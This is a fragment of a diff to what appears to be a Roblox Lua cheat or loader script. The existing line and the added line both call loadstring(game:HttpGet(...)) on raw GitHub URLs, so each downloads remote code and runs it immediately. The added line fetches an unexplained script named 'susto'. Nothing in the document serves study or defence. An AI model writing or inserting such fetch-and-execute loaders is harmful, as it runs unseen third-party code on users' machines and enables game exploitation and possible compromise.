@@ -5,3 +5,4 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/timmyVeryCrazy/FleeTh
 task.wait(5)
 
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aaahdjdhcncj-droid/Script-aleat-rios/refs/heads/main/susto"))()
